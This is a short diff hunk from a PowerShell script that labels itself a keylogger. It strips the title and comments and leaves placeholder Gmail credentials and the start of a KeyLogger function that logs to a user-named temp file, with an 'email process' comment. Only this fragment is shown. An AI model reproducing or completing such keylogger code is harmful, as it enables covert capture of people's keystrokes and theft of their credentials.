@@ -1,11 +1,6 @@
-# powershell keylogger
-# created by : C0SM0
-
-# gmail credentials
 $email = "example@gmail.com"
 $password = "password"
 
-# keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
   # email process
